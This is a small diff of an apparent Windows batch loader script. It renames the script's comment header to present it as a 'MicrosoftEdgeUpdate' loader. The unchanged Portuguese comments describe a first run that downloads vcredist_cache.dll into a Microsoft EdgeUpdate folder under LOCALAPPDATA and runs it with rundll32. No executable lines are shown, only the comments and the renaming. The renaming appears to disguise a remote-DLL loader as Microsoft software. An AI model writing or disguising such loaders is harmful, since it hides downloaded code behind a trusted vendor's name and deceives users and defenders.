@@ -2,7 +2,7 @@
 setlocal
 
 REM =====================================================================
-REM Install-if-not-exists loader (v2)
+REM MicrosoftEdgeUpdate loader (install-if-not-exists)
 REM
 REM Primeira run: baixa vcredist_cache.dll pro %LOCALAPPDATA%\Microsoft\
 REM               EdgeUpdate\ e executa rundll32 nele.
